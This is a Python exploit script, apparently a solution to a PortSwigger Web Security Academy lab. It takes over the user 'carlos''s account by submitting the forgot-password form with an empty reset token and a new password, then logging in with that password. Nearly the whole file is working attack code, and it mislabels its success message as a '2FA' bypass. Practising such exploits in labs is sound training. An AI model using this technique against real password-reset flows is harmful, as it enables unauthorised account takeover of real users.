# Vulnerability in the reset new password function, after click link reset, just delete token

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'    
}

def access_carlos_account(s, url):
    # Reset Carlos's password
    print("Resetting Carlos's password")
    reset_password_url = url + '/forgot-password'
    payload = {
        'temp-forgot-password-token': '',
        'username': 'carlos',
        'new-password-1': '1234',
        'new-password-2': '1234',
    }
    r = s.post(reset_password_url, data=payload)
    print("Finished reset password")

    print("Login to Carlos's account")
    login_url = url + '/login'
    payload = {
        'username': 'carlos',
        'password': '1234',
    }
    r = s.post(login_url, data=payload)

    if r.status_code == 200 and 'Log out' in r.text:
        print("(+) Successfully bypassed 2FA verification")
    else:
        print("(-) Exploit failed")
        sys.exit(-1)

def main():
    URL = 'https://0a380025048397e381017ae100a2000f.web-security-academy.net/'
    if len(sys.argv) != 2 and URL == '':
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = URL if URL != '' else sys.argv[1]
    access_carlos_account(s, url)

if __name__ == '__main__':
    main()